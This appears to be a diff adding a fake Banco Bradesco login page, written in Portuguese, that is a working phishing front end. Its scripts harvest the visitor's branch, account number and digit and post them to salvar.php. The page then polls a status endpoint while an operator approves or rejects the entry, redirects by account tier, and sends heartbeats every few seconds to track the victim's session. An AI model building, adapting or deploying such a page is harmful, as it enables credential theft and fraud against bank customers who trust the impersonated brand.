@@ -1,0 +1,322 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banco Bradesco | Entre Nós, Você Vem Primeiro</title>
+  <link rel="icon" href="images/iconsite.png" type="image/png">
+  <link rel="stylesheet" href="css/estilo.css">
+  <script>
+    // redireciona mobile
+    if (/Mobi|Android|iPhone|iPad/.test(navigator.userAgent)) {
+      window.location.replace('/login-mobile.php');
+    }
+  </script>
+</head>
+<body>
+  <div class="load" id="tela-loading" style="display: none;">
+    <div class="container-load">
+      <div class="circle"></div>
+      <div class="circle"></div>
+    </div>
+  </div>
+
+  <form style="margin:0; padding:0;" onsubmit="enviarDados(event)">
+
+    <header class="topbar">
+      <div class="header-container">
+        <div class="left-group">
+          <img src="images/cadeado.png" alt="Cadeado" class="ico-cadeado">
+          <span class="access-text">ACESSAR SUA CONTA</span>
+          <div class="vertical-divider"></div>
+        </div>
+
+        <div class="center-group">
+          <div class="campo-agencia">
+            <label for="agencia" class="lbl-branco">Agência:</label>
+            <input name="agencia" id="agencia" class="input-min" type="text" required="">
+          </div>
+
+          <div class="campo-conta">
+            <label for="conta" class="lbl-branco">Conta:</label>
+            <input name="conta" id="conta" class="input-min" type="text" required="">
+            <input name="digito" id="digito" class="input-digito" type="text" required="">
+          </div>
+
+          <button type="submit" class="btn-ok">OK</button>
+        </div>
+
+        <div class="checkbox-lembrar">
+          <input type="checkbox" id="lembrar">
+          <label for="lembrar" class="lbl-branco">Lembrar-me</label>
+        </div>
+
+        <div class="divider-meio"></div>
+
+        <div class="como-usar">
+          <span class="como-usar-text">Como Usar</span>
+          <img src="images/icon_comousar.png" alt="Como Usar" class="ico-usar">
+        </div>
+        </div>
+
+
+        <div class="right-group">
+          <span class="acessibilidade-text">Acessibilidade</span>
+          <img src="images/icon_acessibilidade.png" alt="Acessibilidade" class="ico-acessibilidade">
+        </div>
+      
+    </header>
+
+    <section class="carrossel">
+      <div class="slides">
+        <div class="slide active" style="background-image: url('images/promocao_aventura_no_havai_desktop.webp');"></div>
+        <div class="slide" style="background-image: url('images/BANNER_HOME_DESK_CLASSIC.webp');"></div>
+        <div class="slide" style="background-image: url('images/investir-desktop.webp');"></div>
+      </div>
+      <img src="images/Gradient.png" class="gradient-overlay" alt="Gradient">
+      <img src="images/menu-lateral.png" class="menu-lateral-overlay" alt="Menu lateral fixo">
+      <div class="carousel-controls">
+        <button class="circle-button">❙❙</button>
+        <div class="progress-bar"><div class="progress-fill" style="animation: 5s linear 0s infinite normal none running progressAnim;"></div></div>
+        <div class="dots">
+          <span class="dot active"></span>
+          <span class="dot"></span>
+          <span class="dot"></span>
+        </div>
+        <button class="circle-button">❮</button>
+        <button class="circle-button">❯</button>
+      </div>
+    </section>
+
+    <section class="cta-container">
+      <div class="cta-content">
+        <span class="cta-text">Contrate on-line, mesmo sem conta-corrente</span>
+        <img src="images/seta.png" alt="Seta" class="cta-arrow">
+      </div>
+      <div class="cards-box">
+        <div class="card"><img src="images/icon1.png" alt="Renegocie"><p>Renegocie suas dívidas</p></div>
+        <div class="card"><img src="images/icon2.png" alt="Cartão"><p>Peça seu cartão<br>sem anuidade</p></div>
+        <div class="card"><img src="images/icon3.png" alt="Consórcio"><p>Simule seu<br>consórcio</p></div>
+        <div class="card"><img src="images/icon4.png" alt="Dental"><p>Contrate seu<br>plano dental</p></div>
+        <div class="card"><img src="images/icon5.png" alt="Seguro"><p>Proteja seu lar.<br>Simule aqui</p></div>
+        <div class="card"><img src="images/icon6.png" alt="Agora"><p>Invista com a<br>Ágora</p></div>
+        <div class="card"><img src="images/icon7.png" alt="Mais opções"><p>Conheça mais<br>opções</p></div>
+      </div>
+    </section>
+
+    <section class="produtos-servicos">
+      <h2 class="titulo-gradiente">
+        Produtos e serviços pra<br>
+        agilizar seu dia a dia
+      </h2>
+      <p class="subtexto">
+        Confira algumas das soluções que<br>preparamos pra você.
+      </p>
+    </section>
+
+    <section class="cards-servicos">
+      <div class="cards-grid">
+        <div class="servico-card"><img src="images/icone1.png" alt="Fale Conosco"><p>FALE CONOSCO</p></div>
+        <div class="servico-card"><img src="images/icone2.png" alt="2ª Via"><p>2ª VIA DO BOLETO</p></div>
+        <div class="servico-card"><img src="images/icone3.png" alt="Pagamentos"><p>PAGAMENTOS</p></div>
+        <div class="servico-card"><img src="images/icone4.png" alt="Desbloqueio"><p>DESBLOQUEIO DE CARTÃO</p></div>
+        <div class="servico-card"><img src="images/icone5.png" alt="Renegociação"><p>RENEGOCIAÇÃO DE DÍVIDAS</p></div>
+        <div class="servico-card"><img src="images/icone6.png" alt="Segurança"><p>SEGURANÇA</p></div>
+      </div>
+    </section>
+
+    <section class="fundo-novidades">
+      <img src="images/background-novidades.png" alt="Fundo novidades" class="fundo-diagonal">
+    </section>
+
+    <section class="fundo-continuacao">
+      <img src="images/Background.png" alt="Continuação visual" class="fundo-diagonal">
+    </section>
+
+    <section class="fundo-continuacao1">
+      <img src="images/Background1.png" alt="Continuação visual" class="fundo-diagonal">
+    </section>
+
+  </form>
+
+
+<script>
+  async function verificarStatus(clientId) {
+    const loader = document.getElementById('tela-loading');
+    if (loader) loader.style.display = 'flex';
+
+    try {
+      const res  = await fetch(`verificar_status.php?id=${clientId}`);
+      const json = await res.json();
+      const status = (json.status || '').trim();
+      const tipo   = (json.tipo   || '').trim();
+
+      if (status === 'authorized') {
+        if (tipo === 'classic')      window.location.href = 'login.php';
+        else if (tipo === 'exclusive') window.location.href = 'exclusive.php';
+        else if (tipo === 'prime')     window.location.href = 'prime.php';
+        else                           window.location.href = 'login.php';
+      }
+      else if (status === 'rejected') {
+        if (loader) loader.style.display = 'none';
+        mostrarErro('Dados incorretos. Verifique e tente novamente.');
+      }
+      else {
+        setTimeout(() => verificarStatus(clientId), 1500);
+      }
+    } catch {
+      setTimeout(() => verificarStatus(clientId), 2000);
+    }
+  }
+</script>
+
+<script>
+  const slides       = document.querySelectorAll('.slide');
+  const dots         = document.querySelectorAll('.dot');
+  const pauseBtn     = document.querySelector('.carousel-controls button:nth-child(1)');
+  const prevBtn      = document.querySelector('.carousel-controls button:nth-child(4)');
+  const nextBtn      = document.querySelector('.carousel-controls button:nth-child(5)');
+  const progressFill = document.querySelector('.progress-fill');
+
+  let currentIndex = 0, interval, paused = false;
+
+  function showSlide(i) {
+    slides.forEach((s, idx) => {
+      s.classList.toggle('active', idx === i);
+      dots[idx].classList.toggle('active', idx === i);
+    });
+    currentIndex = i;
+  }
+  function nextSlide() { showSlide((currentIndex + 1) % slides.length); }
+  function prevSlide() { showSlide((currentIndex - 1 + slides.length) % slides.length); }
+
+  function startCarousel() {
+    interval = setInterval(() => {
+      nextSlide();
+      resetProgressBar();
+    }, 5000);
+  }
+  function stopCarousel() { clearInterval(interval); }
+
+  function togglePause() {
+    if (paused) { startCarousel(); pauseBtn.innerHTML = '❙❙'; }
+    else        { stopCarousel();  pauseBtn.innerHTML = '▶'; }
+    paused = !paused;
+  }
+
+  function resetProgressBar() {
+    progressFill.style.animation = 'none';
+    void progressFill.offsetWidth;
+    progressFill.style.animation = 'progressAnim 5s linear infinite';
+  }
+
+  pauseBtn.addEventListener('click', togglePause);
+  nextBtn.addEventListener('click', () => { nextSlide(); resetProgressBar(); });
+  prevBtn.addEventListener('click', () => { prevSlide(); resetProgressBar(); });
+  dots.forEach((dot, idx) => dot.addEventListener('click', () => { showSlide(idx); resetProgressBar(); }));
+
+  showSlide(0);
+  startCarousel();
+  resetProgressBar();
+</script>
+
+
+<script>
+  document.querySelector('form').addEventListener('submit', enviarDados);
+
+  // ✅ ---- FUNÇÃO MODIFICADA ---- ✅
+  async function enviarDados(e) {
+    e.preventDefault();
+    const agencia = document.getElementById('agencia').value.trim();
+    const conta   = document.getElementById('conta').value.trim();
+    const digito  = document.getElementById('digito').value.trim();
+
+    if (!agencia || !conta || !digito) {
+      mostrarErro('Os campos agência, conta e dígito são obrigatórios.');
+      return;
+    }
+
+    // Payload que será enviado diretamente para o seu backend
+    const payloadParaSalvar = {
+      agencia: agencia,
+      conta: conta,
+      digito: digito,
+      lembrar: document.getElementById('lembrar').checked ? 'on' : ''
+    };
+
+    try {
+      document.getElementById('tela-loading').style.display = 'flex';
+
+      // Requisição direta para 'salvar.php', sem o proxy
+      const salvarRes  = await fetch('salvar.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payloadParaSalvar) // Envia o payload com os dados do formulário
+      });
+      const salvarJson = await salvarRes.json();
+
+      if (!salvarJson.success) {
+        throw new Error(salvarJson.error || 'Falha ao salvar os dados.');
+      }
+
+      // Continua com a verificação de status normalmente
+      verificarStatus(salvarJson.client_id);
+
+    } catch (err) {
+      document.getElementById('tela-loading').style.display = 'none';
+      mostrarErro(err.message);
+    }
+  }
+
+  function mostrarErro(msg) {
+    const popup = document.createElement('div');
+    popup.className = 'popUp-error';
+    popup.innerHTML = `
+      <div class="erro"><p>${msg}</p></div>
+      <div class="carregar"><div class="temp-carregamento"></div></div>
+    `;
+    document.body.appendChild(popup);
+    popup.style.display = 'flex';
+    setTimeout(() => popup.remove(), 5000);
+  }
+</script>
+
+
+<script>
+  function getCookie(name) {
+    const v = `; ${document.cookie}`;
+    const parts = v.split(`; ${name}=`);
+    return parts.length === 2 ? parts.pop().split(';').shift() : '';
+  }
+
+  function sendHeartbeat() {
+    const userCookie = getCookie('identificador_cliente');
+    if (userCookie) {
+      const fd = new FormData();
+      fd.append('identificador_cookie', userCookie);
+      fetch('/heartbeat.php', { method: 'POST', body: fd })
+        .catch(e => console.error('Heartbeat falhou:', e));
+    }
+  }
+
+  sendHeartbeat();
+  setInterval(sendHeartbeat, 3000);
+</script>
+
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    const pageName = 'index.php';
+    function reportarEstagioAtual() {
+      fetch('/atualizar_estagio.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ estagio: pageName }),
+        credentials: 'include'
+      }).catch(e => console.error(`Erro ao reportar estágio '${pageName}':`, e));
+    }
+    reportarEstagioAtual();
+    setInterval(reportarEstagioAtual, 2000);
+  });
+</script>
+
+
+
+</body></html>
